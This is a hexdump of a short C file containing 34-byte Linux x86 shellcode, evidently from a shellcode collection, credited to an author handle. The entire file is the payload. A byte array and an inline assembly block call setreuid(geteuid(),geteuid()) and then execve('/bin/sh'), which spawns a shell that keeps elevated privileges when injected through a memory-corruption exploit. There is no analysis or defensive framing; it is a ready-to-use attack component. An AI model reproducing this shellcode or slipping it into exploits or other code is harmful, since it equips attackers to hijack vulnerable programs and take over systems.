00000000  2f 2a 0d 0a 20 2a 0d 0a  20 2a 20 6c 69 6e 75 78  |/*.. *.. * linux|
00000010  2f 78 38 36 20 73 65 74  72 65 75 69 64 28 67 65  |/x86 setreuid(ge|
00000020  74 65 75 69 64 28 29 2c  67 65 74 65 75 69 64 28  |teuid(),geteuid(|
00000030  29 29 2c 65 78 65 63 76  65 28 22 2f 62 69 6e 2f  |)),execve("/bin/|
00000040  73 68 22 2c 30 2c 30 29  20 33 34 62 79 74 65 20  |sh",0,0) 34byte |
00000050  75 6e 69 76 65 72 73 61  6c 20 73 68 65 6c 6c 63  |universal shellc|
00000060  6f 64 65 0d 0a 20 2a 0d  0a 20 2a 20 62 6c 75 65  |ode.. *.. * blue|
00000070  39 30 35 37 20 72 6f 6f  74 40 62 6c 75 65 39 30  |9057 root@blue90|
00000080  35 37 2e 63 6f 6d 0d 0a  20 2a 0d 0a 20 2a 20 2f  |57.com.. *.. * /|
00000090  0d 0a 69 6e 74 20 6d 61  69 6e 28 29 0d 0a 7b 0d  |..int main()..{.|
000000a0  0a 20 20 20 20 63 68 61  72 20 73 68 65 6c 6c 63  |.    char shellc|
000000b0  6f 64 65 5b 5d 3d 22 5c  78 36 61 5c 78 33 31 5c  |ode[]="\x6a\x31\|
000000c0  78 35 38 5c 78 39 39 5c  78 63 64 5c 78 38 30 5c  |x58\x99\xcd\x80\|
000000d0  78 38 39 5c 78 63 33 5c  78 38 39 5c 78 63 31 5c  |x89\xc3\x89\xc1\|
000000e0  78 36 61 5c 78 34 36 22  0d 0a 20 20 20 20 20 20  |x6a\x46"..      |
000000f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000100  20 20 20 20 20 20 20 20  22 5c 78 35 38 5c 78 63  |        "\x58\xc|
00000110  64 5c 78 38 30 5c 78 62  30 5c 78 30 62 5c 78 35  |d\x80\xb0\x0b\x5|
00000120  32 5c 78 36 38 5c 78 36  65 5c 78 32 66 5c 78 37  |2\x68\x6e\x2f\x7|
00000130  33 5c 78 36 38 5c 78 36  38 22 0d 0a 20 20 20 20  |3\x68\x68"..    |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000150  20 20 20 20 20 20 20 20  20 20 22 5c 78 32 66 5c  |          "\x2f\|
00000160  78 32 66 5c 78 36 32 5c  78 36 39 5c 78 38 39 5c  |x2f\x62\x69\x89\|
00000170  78 65 33 5c 78 38 39 5c  78 64 31 5c 78 63 64 5c  |xe3\x89\xd1\xcd\|
00000180  78 38 30 22 3b 0d 0a 20  20 20 20 2f 2f 73 65 74  |x80";..    //set|
00000190  72 65 75 69 64 28 67 65  74 65 75 69 64 28 29 2c  |reuid(geteuid(),|
000001a0  67 65 74 65 75 69 64 28  29 29 3b 0d 0a 20 20 20  |geteuid());..   |
000001b0  20 2f 2f 65 78 65 63 76  65 28 22 2f 62 69 6e 2f  | //execve("/bin/|
000001c0  73 68 22 2c 30 2c 30 29  3b 0d 0a 20 20 20 20 5f  |sh",0,0);..    _|
000001d0  5f 61 73 6d 5f 5f 28 22  22 0d 0a 20 20 20 20 20  |_asm__(""..     |
000001e0  20 20 20 20 20 20 20 22  70 75 73 68 20 24 30 78  |       "push $0x|
000001f0  33 31 3b 22 0d 0a 20 20  20 20 20 20 20 20 20 20  |31;"..          |
00000200  20 20 22 70 6f 70 20 25  65 61 78 3b 22 0d 0a 20  |  "pop %eax;".. |
00000210  20 20 20 20 20 20 20 20  20 20 20 22 63 6c 74 64  |           "cltd|
00000220  3b 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |;"..            |
00000230  22 69 6e 74 20 24 30 78  38 30 3b 22 20 20 20 20  |"int $0x80;"    |
00000240  20 20 20 20 2f 2f 20 67  65 74 65 75 69 64 28 29  |    // geteuid()|
00000250  3b 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |;..            "|
00000260  6d 6f 76 20 25 65 61 78  2c 20 25 65 62 78 3b 22  |mov %eax, %ebx;"|
00000270  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 22 6d  |..            "m|
00000280  6f 76 20 25 65 61 78 2c  20 25 65 63 78 3b 22 0d  |ov %eax, %ecx;".|
00000290  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 70 75  |.            "pu|
000002a0  73 68 20 24 30 78 34 36  3b 22 20 20 20 20 2f 2f  |sh $0x46;"    //|
000002b0  20 73 65 74 72 65 75 69  64 28 67 65 74 65 75 69  | setreuid(geteui|
000002c0  64 28 29 2c 67 65 74 65  75 69 64 28 29 29 3b 0d  |d(),geteuid());.|
000002d0  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 70 6f  |.            "po|
000002e0  70 20 25 65 61 78 3b 22  0d 0a 20 20 20 20 20 20  |p %eax;"..      |
000002f0  20 20 20 20 20 20 22 69  6e 74 20 24 30 78 38 30  |      "int $0x80|
00000300  3b 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |;"..            |
00000310  22 6d 6f 76 20 24 30 78  62 2c 20 25 61 6c 3b 22  |"mov $0xb, %al;"|
00000320  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 22 70  |..            "p|
00000330  75 73 68 20 25 65 64 78  3b 22 0d 0a 20 20 20 20  |ush %edx;"..    |
00000340  20 20 20 20 20 20 20 20  22 70 75 73 68 20 24 30  |        "push $0|
00000350  78 36 38 37 33 32 66 36  65 3b 22 0d 0a 20 20 20  |x68732f6e;"..   |
00000360  20 20 20 20 20 20 20 20  20 22 70 75 73 68 20 24  |         "push $|
00000370  30 78 36 39 36 32 32 66  32 66 3b 22 0d 0a 20 20  |0x69622f2f;"..  |
00000380  20 20 20 20 20 20 20 20  20 20 22 6d 6f 76 20 25  |          "mov %|
00000390  65 73 70 2c 20 25 65 62  78 3b 22 0d 0a 20 20 20  |esp, %ebx;"..   |
000003a0  20 20 20 20 20 20 20 20  20 22 6d 6f 76 20 25 65  |         "mov %e|
000003b0  64 78 2c 20 25 65 63 78  3b 22 0d 0a 20 20 20 20  |dx, %ecx;"..    |
000003c0  20 20 20 20 20 20 20 20  22 69 6e 74 20 24 30 78  |        "int $0x|
000003d0  38 30 3b 22 20 20 20 20  20 20 20 20 2f 2f 20 65  |80;"        // e|
000003e0  78 65 63 76 65 28 22 2f  62 69 6e 2f 73 68 22 2c  |xecve("/bin/sh",|
000003f0  30 2c 30 29 3b 0d 0a 20  20 20 20 20 20 20 20 20  |0,0);..         |
00000400  20 20 20 22 22 29 3b 0d  0a 7d                    |   "");..}|
0000040a
